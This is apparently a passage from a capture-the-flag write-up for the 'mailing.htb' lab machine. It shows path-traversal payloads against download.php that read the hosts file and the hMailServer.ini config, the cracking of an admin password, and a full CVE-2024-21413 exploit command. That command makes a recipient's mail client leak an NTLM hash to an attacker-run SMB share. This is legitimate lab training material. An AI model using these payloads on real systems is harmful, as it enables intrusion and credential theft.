HTTP and several mailing services are open. First I'll browse http server.

The main page holds interesting download button, which is connected to download.php?file=instructions.pdf. We may be able to download other files from this url. Let's try this.

I tested with download.php?file=../../../../../Windows/System32/drivers/etc/hosts and it successfully donwloaded the file.

Foothold

Because we can install arbitrary file with this method, we can install config file if we could find it. But the application we know it's running on the target machine is only hMailservice. Therefore, I'll research its configuration file in google.

Searching hmailserver configuration file location revealed that the service config file is locate to C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini or C:\Program Files\hMailServer\Bin\hMailServer.ini in default. Let's try the path.

The path download.php?file=../../../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini let me getting config file.

There is admin password. I could decoded it with crackstation, and it returned homenetworkingadministrator.

Also, the target server hosts mail server, which means also need to use mail client. So, I decided to search client side vulnerability.

Simple keyword window mail vulnerability returned this poc.

This poc also says it can leak NLTM hash via SMPT. To test it, we can use impacket-smbserver and include test.txt into url.

└─$ echo 'test' > test.txt
└─$ impacket-smbserver share . -smb2support

Then, runt the poc. I tested all possible combination for username and sender email, and below code worked.

python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.40\share\test.txt" --subject test
